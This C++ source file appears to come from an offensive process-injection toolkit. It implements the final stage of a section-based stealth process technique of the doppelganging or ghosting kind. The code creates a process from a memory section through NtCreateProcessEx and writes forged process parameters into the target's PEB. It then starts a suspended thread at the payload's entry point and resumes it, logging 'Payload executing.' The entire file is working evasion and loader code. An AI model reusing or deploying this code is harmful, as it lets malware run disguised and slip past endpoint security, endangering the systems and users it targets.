#include "ProcessExecutor.hpp"
#include "ErrorHandler.hpp"
#include <iostream>

HANDLE ProcessExecutor::CreateProcessFromSection(HANDLE sectionHandle)
{
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    NTSTATUS status = DynamicNT::Instance().NtCreateProcessEx(
        &hProcess,
        PROCESS_ALL_ACCESS,
        &objAttr,
        GetCurrentProcess(),
        0,
        sectionHandle,
        NULL,
        NULL,
        0);

    if (!NT_SUCCESS(status))
    {
        CommonUtils::LogStatus("NtCreateProcessEx", status);
        return NULL;
    }

    std::cout << "[+] Process object created from section." << std::endl;
    return hProcess;
}

bool ProcessExecutor::SetupProcessParameters(HANDLE processHandle, const std::wstring &imagePath)
{
    UNICODE_STRING uImagePath;
    CommonUtils::ToUnicodeString(imagePath, uImagePath);

    RTL_USER_PROCESS_PARAMETERS_FULL *params = nullptr;
    NTSTATUS status = DynamicNT::Instance().RtlCreateProcessParametersEx(
        &params,
        &uImagePath,
        NULL, NULL,
        &uImagePath,
        NULL, NULL, NULL, NULL, NULL,
        0x01);

    if (!NT_SUCCESS(status))
    {
        CommonUtils::LogStatus("RtlCreateProcessParametersEx", status);
        return false;
    }

    PVOID remoteParams = VirtualAllocEx(
        processHandle, params, params->MaximumLength,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!remoteParams)
    {
        remoteParams = VirtualAllocEx(
            processHandle, NULL, params->MaximumLength,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

        if (!remoteParams)
        {
            std::cerr << "[-] VirtualAllocEx for process parameters failed. Error: "
                      << GetLastError() << std::endl;
            DynamicNT::Instance().RtlDestroyProcessParameters(params);
            return false;
        }

        intptr_t delta = reinterpret_cast<intptr_t>(remoteParams) -
                         reinterpret_cast<intptr_t>(params);

        auto rebase = [&](UNICODE_STRING &us) {
            if (us.Buffer)
                us.Buffer = reinterpret_cast<PWCH>(reinterpret_cast<intptr_t>(us.Buffer) + delta);
        };

        rebase(params->CurrentDirectory.DosPath);
        rebase(params->DllPath);
        rebase(params->ImagePathName);
        rebase(params->CommandLine);
        rebase(params->WindowTitle);
        rebase(params->DesktopInfo);
        rebase(params->ShellInfo);
        rebase(params->RuntimeData);
    }

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(processHandle, remoteParams, params, params->MaximumLength, &bytesWritten))
    {
        std::cerr << "[-] WriteProcessMemory for process parameters failed. Error: "
                  << GetLastError() << std::endl;
        VirtualFreeEx(processHandle, remoteParams, 0, MEM_RELEASE);
        DynamicNT::Instance().RtlDestroyProcessParameters(params);
        return false;
    }

    PROCESS_BASIC_INFORMATION pbi = {};
    DynamicNT::Instance().NtQueryInformationProcess(
        processHandle, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

    PVOID pebParamsField = reinterpret_cast<PVOID>(
        reinterpret_cast<uintptr_t>(pbi.PebBaseAddress) + 0x20);

    if (!WriteProcessMemory(processHandle, pebParamsField, &remoteParams, sizeof(remoteParams), &bytesWritten))
    {
        std::cerr << "[-] WriteProcessMemory for PEB.ProcessParameters failed. Error: "
                  << GetLastError() << std::endl;
        VirtualFreeEx(processHandle, remoteParams, 0, MEM_RELEASE);
        DynamicNT::Instance().RtlDestroyProcessParameters(params);
        return false;
    }

    DynamicNT::Instance().RtlDestroyProcessParameters(params);
    std::cout << "[+] Process parameters written to target process." << std::endl;
    return true;
}

HANDLE ProcessExecutor::CreateProcessThread(HANDLE processHandle, uint32_t entryPointRVA)
{
    HANDLE hThread = NULL;
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    PROCESS_BASIC_INFORMATION pbi = {};
    NTSTATUS queryStatus = DynamicNT::Instance().NtQueryInformationProcess(
        processHandle, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);

    if (!NT_SUCCESS(queryStatus))
    {
        CommonUtils::LogStatus("NtQueryInformationProcess", queryStatus);
        return NULL;
    }

    PVOID imageBase = nullptr;
    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(
            processHandle,
            reinterpret_cast<LPCVOID>(reinterpret_cast<uintptr_t>(pbi.PebBaseAddress) + 0x10),
            &imageBase, sizeof(imageBase), &bytesRead) || bytesRead != sizeof(imageBase))
    {
        std::cerr << "[-] Failed to read ImageBaseAddress from PEB. Error: " << GetLastError() << std::endl;
        return NULL;
    }

    PVOID startRoutine = reinterpret_cast<PVOID>(
        reinterpret_cast<uintptr_t>(imageBase) + entryPointRVA);

    NTSTATUS status = DynamicNT::Instance().NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        &objAttr,
        processHandle,
        startRoutine,
        NULL,
        THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
        0, 0, 0, NULL);

    if (!NT_SUCCESS(status))
    {
        CommonUtils::LogStatus("NtCreateThreadEx", status);
        return NULL;
    }

    std::cout << "[+] Thread created at entry point RVA: 0x" << std::hex << entryPointRVA << std::dec << std::endl;
    return hThread;
}

bool ProcessExecutor::ExecutePayload(HANDLE threadHandle)
{
    ULONG numSuspend = 0;
    NTSTATUS status = DynamicNT::Instance().NtResumeThread(threadHandle, &numSuspend);

    if (!NT_SUCCESS(status))
    {
        CommonUtils::LogStatus("NtResumeThread", status);
        return false;
    }

    std::cout << "[+] Thread resumed. Payload executing." << std::endl;
    return true;
}

bool ProcessExecutor::Run(HANDLE sectionHandle, uint32_t entryPointRVA, const std::wstring &imagePath)
{
    HANDLE hProcess = CreateProcessFromSection(sectionHandle);
    if (!hProcess)
        return false;

    if (!SetupProcessParameters(hProcess, imagePath))
    {
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateProcessThread(hProcess, entryPointRVA);
    if (!hThread)
    {
        CloseHandle(hProcess);
        return false;
    }

    bool success = ExecutePayload(hThread);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return success;
}
